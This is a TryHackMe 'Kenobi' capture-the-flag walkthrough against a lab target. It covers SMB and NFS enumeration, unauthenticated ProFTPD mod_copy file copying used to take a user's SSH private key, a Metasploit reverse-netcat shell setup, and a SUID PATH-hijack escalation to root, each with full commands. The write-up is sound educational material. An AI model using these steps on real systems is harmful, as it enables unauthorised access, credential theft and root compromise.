# TryHackMe — Kenobi

**Target:** `10.49.130.234`
**Category:** Linux, SMB/NFS enumeration, ProFTPD `mod_copy` RCE, SUID PATH hijack privesc
**Tools:** `nmap`, `smbclient`/`smbget`, `netcat`, `searchsploit`, standard Linux CLI

---

## 1. Recon — Port Scan

```bash
nmap -sSVC -p- -oA nmap_full -v 10.49.130.234
```

Key results:

| Port | Service | Version |
|---|---|---|
| 21/tcp | ftp | ProFTPD 1.3.5 |
| 22/tcp | ssh | OpenSSH 7.2p2 Ubuntu |
| 80/tcp | http | Apache 2.4.18 (Ubuntu), `robots.txt` disallows `/admin.html` |
| 111/tcp | rpcbind | exposes NFS (2049), mountd, nlockmgr |
| 139, 445/tcp | smb | Samba 4.3.11-Ubuntu |
| 2049/tcp | nfs | — |

Seven ports total when counting the distinct listening services (21, 22, 80, 111, 139, 445, 2049) — the rest are RPC-mapped high ports for mountd/nlockmgr rather than independently interesting services.

Two things stand out immediately: an old, known-vulnerable ProFTPD build, and an NFS/SMB stack that's worth enumerating for anonymous access before touching FTP.

---

## 2. Enumerating SMB

```bash
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.49.130.234
```

Three shares are exposed:

- `IPC$` — default hidden admin share
- `anonymous` — `Path: C:\home\kenobi\share`, **anonymous READ/WRITE**
- `print$` — printer drivers, no anonymous access

The `anonymous` share is the one worth pulling:

```bash
smbclient //10.49.130.234/anonymous -N
```

```
smb: \> ls
  log.txt    N    12237
```

```bash
smbget -R smb://10.49.130.234/anonymous
cat log.txt | grep -i port
```

`log.txt` turns out to be install/setup output for the box — it confirms an SSH key was generated for the `kenobi` user, and that ProFTPD was configured to listen on **port 21**.

---

## 3. Enumerating NFS

Port 111 (rpcbind) is the portmapper for NFS — it just tells clients which port the actual NFS/mountd services are listening on, not a service to attack directly.

```bash
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.49.130.234
```

```
| nfs-showmount:
|_  /var *
```

`/var` is exported to anyone (`*`) — this becomes the pivot point for retrieving files we place there via the FTP exploit in the next stage.

---

## 4. Initial Access — ProFTPD `mod_copy` (CVE-2015-3306)

### Confirm the version

```bash
ncat 10.49.130.234 21
```

```
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.49.130.234]
```

### Find the exploit

```bash
searchsploit ProFTPd 1.3.5
```

Three matches, including a ready-made Metasploit module for `mod_copy` command execution.

### The vulnerability

`mod_copy` implements two FTP commands — `SITE CPFR` (copy-from) and `SITE CPTO` (copy-to) — that let the server copy a file from one filesystem path to another **without any authentication**. Since the FTP daemon performs the copy itself as its own process user (here, the `kenobi` user, per `log.txt`), and we know an SSH key was generated for that user, we can exfiltrate it directly.

```bash
ncat 10.49.130.234 21
```

```
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful
```

`/var/tmp` is chosen deliberately — it sits inside the `/var` export we confirmed was NFS-mountable in the previous step, giving us a way to pull the file off without needing FTP write access to anywhere else.

### Metasploit alternative

The same primitive is automatable via `exploit/unix/ftp/proftpd_modcopy_exec`:

```
use exploit/unix/ftp/proftpd_modcopy_exec
set RHOSTS 10.49.130.234
set RPORT 80
set RPORT_FTP 21
set SITEPATH /var/www/html
set TARGETURI /
set LHOST 192.168.x.x
set PAYLOAD cmd/unix/reverse_netcat
run
```

Two gotchas worth flagging if you go this route instead of the manual copy above:

- The payload option is **`LHOST`**, not `LHOSTS` — the latter silently creates an unused datastore variable and your listener binds to whatever `LHOST` defaulted to.
- **`SITEPATH`** must point at the real writable *and* web-served document root (`/var/www/html` here) — the module's default of `/var/www` won't be servable by Apache and the copy will report `directory not writable?` even though the copy primitive itself is fine.

Either path — manual SSH key theft or Metasploit RCE — gets you a foothold as `kenobi`.

### Retrieve the key over NFS

```bash
mkdir ~/kenobiNFS
sudo mount 10.49.130.234:/var ~/kenobiNFS
ls -la ~/kenobiNFS/tmp
```

```bash
cp ~/kenobiNFS/tmp/id_rsa .
sudo umount ~/kenobiNFS
chmod 600 id_rsa
ssh -i id_rsa kenobi@10.49.130.234
```

```
kenobi@kenobi:~$ cat user.txt
<user flag>
```

*(Note: `mkdir /mnt/kenobiNFS` will fail with "Permission denied" if attempted — only root can create directories directly under `/mnt`. Use a directory under your own home instead, as above.)*

---

## 5. Privilege Escalation — SUID `PATH` Manipulation

### Find SUID binaries

```bash
find / -perm -u=s -type f 2>/dev/null
```

Everything in the output is a standard system binary (`passwd`, `sudo`, `mount`, `ping`, etc.) **except one**:

```
/usr/bin/menu
```

A custom SUID-root binary sitting alongside standard system tools is always worth investigating first.

### Run it

```
/usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :
```

Three options.

### Inspect it

```bash
strings /usr/bin/menu
```

Buried in the output:

```
curl -I localhost
uname -r
ifconfig
```

These are called by **bare name**, not full path (`/usr/bin/curl`, `/bin/uname`, `/sbin/ifconfig`). Since `menu` is SUID-root, whatever it executes runs with root's privileges — and because it doesn't hardcode paths, it relies on the calling user's `PATH` environment variable to resolve `curl`.

### Exploit it

```bash
cd /tmp
echo /bin/bash > curl
chmod 777 curl
export PATH=/tmp:$PATH
/usr/bin/menu
```

Choose option `1` (status check → internally runs `curl -I localhost`):

```
** Enter your choice :1
root@kenobi:/tmp# id
uid=0(root) gid=1000(kenobi) groups=1000(kenobi),...
```

`PATH` now resolves `curl` to our fake binary (`/bin/bash`) before the real one, and since `menu` executes it with root's effective UID, we get a root shell.

### Grab the flag

```bash
root@kenobi:/tmp# cat /root/root.txt
<root flag>
```

---

## Summary

| Stage | Technique | Root cause |
|---|---|---|
| Recon | `nmap` full port scan | ProFTPD 1.3.5 + open NFS/SMB signaled the attack path |
| Enum | Anonymous SMB share, NFS export | Misconfigured anonymous read/write and world-exported `/var` |
| Foothold | ProFTPD `mod_copy` (CVE-2015-3306) | Unauthenticated `SITE CPFR`/`CPTO` allows arbitrary file copy |
| Privesc | SUID `PATH` hijack | `/usr/bin/menu` calls `curl` without an absolute path (CWE-426) |

**Lesson:** file-copy primitives are only as dangerous as the paths they can reach, and SUID binaries are only as safe as the `PATH` hygiene of everything they shell out to.
